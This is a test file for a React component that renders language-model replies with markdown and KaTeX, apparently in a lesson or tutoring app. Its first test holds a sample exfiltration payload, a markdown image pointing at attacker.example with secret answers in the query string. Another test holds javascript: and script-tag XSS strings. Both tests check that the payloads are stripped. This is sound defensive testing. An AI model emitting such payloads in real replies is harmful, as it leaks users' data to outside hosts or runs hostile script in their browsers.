import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { LessonText } from './LessonText.jsx';

const render = (text) => renderToStaticMarkup(<LessonText text={text} dir="ltr" />);

describe('LessonText', () => {
  it('never renders images, so a reply cannot leak data through an image URL', () => {
    const html = render('Great! ![x](https://attacker.example/log?answers=secret)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
  });

  it('opens links in a new tab without passing on this page', () => {
    const html = render('See [the source](https://example.org/page).');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });

  it('drops script links and raw HTML from model output', () => {
    const html = render('[click](javascript:alert(1)) <script>alert(2)</script>');
    expect(html).not.toContain('javascript:');
    expect(html).not.toContain('<script');
  });

  it('renders formulas with KaTeX', () => {
    expect(render('Area: $x^2$')).toContain('class="katex"');
  });

  it('has a style for every part of a rendered formula', () => {
    // KaTeX renames its CSS classes between versions: a stylesheet that does not match the
    // renderer leaves formulas unstyled, and they break mid-symbol.
    const require = createRequire(import.meta.url);
    const css = readFileSync(require.resolve('katex/dist/katex.min.css'), 'utf8');
    const html = render(String.raw`$6CO_2 \xrightarrow{light} C_6H_{12}O_6$ and $\frac{1}{2}$`);
    const formulas = html.slice(html.indexOf('class="katex"'));
    const classes = [...formulas.matchAll(/class="([^"]+)"/g)].flatMap((m) => m[1].split(' '));
    const hasRule = (name) => new RegExp(String.raw`\.${name}(?![\w-])`).test(css);
    const unstyled = classes.filter((name) => !ATOM_TYPES.has(name) && !hasRule(name));
    expect(unstyled).toEqual([]);
  });

  it('shows a broken formula from the model instead of failing', () => {
    expect(() => render(String.raw`Half is $\frac{1}{$`)).not.toThrow();
  });
});

// Classes that only name the kind of math symbol; KaTeX's stylesheet has no rules for them.
const ATOM_TYPES = new Set([
  'mord',
  'mop',
  'mbin',
  'mrel',
  'mopen',
  'mclose',
  'mpunct',
  'minner',
  'mtight',
]);
